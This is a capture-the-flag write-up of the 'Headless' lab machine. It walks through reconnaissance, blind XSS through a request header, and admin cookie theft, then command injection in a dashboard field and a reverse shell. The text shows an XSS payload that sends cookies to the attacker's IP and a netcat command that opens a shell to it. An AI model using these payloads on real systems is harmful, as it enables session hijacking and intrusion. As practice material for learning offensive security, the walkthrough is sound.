# Headless (Easy)

# Machine Info
Headless is an easy-difficulty Linux machine that features a Python Werkzeug server hosting a website. The website has a customer support form, which is found to be vulnerable to blind Cross-Site Scripting (XSS) via the User-Agent header. This vulnerability is leveraged to steal an admin cookie, which is then used to access the administrator dashboard. The page is vulnerable to command injection, leading to a reverse shell on the box. Enumerating the user’s mail reveals a script that does not use absolute paths, which is leveraged to get a shell as root.

# Reconnaissance
## nmap
```
nmap -sCV 10.129.100.124 -o headless.out --min-rate 10000 -p- -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-05 15:35 EST
Nmap scan report for 10.129.100.124
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Under Construction
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds
```
From the nmap scan, `port 5000` is running Werkzeug / Python

# Enumeration
## HTTP - TCP 5000

### Directory Brute-Force
<img width="651" height="578" alt="image" src="https://github.com/user-attachments/assets/1dfd6d08-0404-4ec8-aa88-502e656a2cbb" />

```
feroxbuster -u http://10.129.100.124:5000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404,403 -x php,html,txt,py
```

The scan found two accessible directories — `/support` and `/dashboard`.

---
### Site
<img width="455" height="314" alt="image" src="https://github.com/user-attachments/assets/614b727e-adc3-43d7-83d5-2f7af30466be" />\
<img width="291" height="712" alt="image" src="https://github.com/user-attachments/assets/af670b0e-f643-4921-b551-687af2a8df29" />\
<img width="1059" height="231" alt="image" src="https://github.com/user-attachments/assets/1c4c4519-6aba-4ab9-902e-7c2c563f2c80" />


The button redirects to `/support`, where there is a contact form. However, no feedback is displayed after submitting the form.
Also, `\dashboard` page was unable to be accessed.

---
### XSS
<img width="316" height="729" alt="image" src="https://github.com/user-attachments/assets/d0810392-ea67-467c-b562-7bc0818e2863" />\
<img width="655" height="518" alt="image" src="https://github.com/user-attachments/assets/514aeaeb-4b0d-4cc1-af69-68a6db53bb4c" />


```
<script>alert(10)</script>
```

A simple XSS payload was inserted into the message field, which accepts user input. The server responded with a page containing the following cookie value:

`is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs`

<img width="524" height="329" alt="image" src="https://github.com/user-attachments/assets/424b2bd8-9583-48fc-88de-bf4dd5fc4732" />


<img width="921" height="596" alt="image" src="https://github.com/user-attachments/assets/9d8f5bd9-a64a-476d-b984-e4c9c464aeee" />

```
<script>alert(10)</script>
" onmouseover="alert(10)"
>
<>
```

After inspecting the page source, input field was identified as the picture.
Based on the source, several XSS payloads were inserted into this field. The server either responded with a page containing the cookie value or returned no response.

<img width="1297" height="350" alt="image" src="https://github.com/user-attachments/assets/58266d23-d8ea-404a-b810-74731cedc428" />

No XSS payloads worked, so a random header was added, and its value was reflected in the page.

<img width="1370" height="360" alt="image" src="https://github.com/user-attachments/assets/a767a409-15f0-4c09-bedf-c3521ee1ef56" />

```
<script>alert(10)</script>
```
A simple XSS payload (<script>alert(10)</script>) was inserted into the custom header and was reflected in the page.

<img width="869" height="170" alt="image" src="https://github.com/user-attachments/assets/160a799a-fbb0-4181-bbd9-7bc5691396ee" />

```
<svg onload="new Image().src='http://10.10.14.107/?c='+document.cookie">
```

An HTTP server was started on the attacker machine, and a cookie-stealing payload was inserted into the custom header. Then, new cookie was revealed : `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`

<img width="562" height="57" alt="image" src="https://github.com/user-attachments/assets/25c7cc75-e219-4443-971a-83a0f1a7d82d" />\
<img width="1058" height="411" alt="image" src="https://github.com/user-attachments/assets/72ab8547-b8af-446c-a509-150026b1c59e" />

The newly revealed cookie was inserted, and the /dashboard page was successfully accessed.


<img width="1430" height="830" alt="image" src="https://github.com/user-attachments/assets/729b208d-a1c6-4e39-a91e-2993dce387a9" />

In the browser, nothing could be modified, but the date field was the only parameter that accepted user input in Burp Suite. Appending the Linux command `id` to the date field caused the server to respond with the output of the `id` command.

---
# Shell as dvir

<img width="509" height="381" alt="image" src="https://github.com/user-attachments/assets/3e7bfcb6-6179-4de9-a85f-45f14fe08fe9" />/
<img width="250" height="42" alt="image" src="https://github.com/user-attachments/assets/1a79f800-5e55-4e7c-9ff7-8fa313b195eb" />

```
nc -c sh 10.10.14.107 4444
```
The command was inserted into the date field and reverse shell as user dvir retrieved.
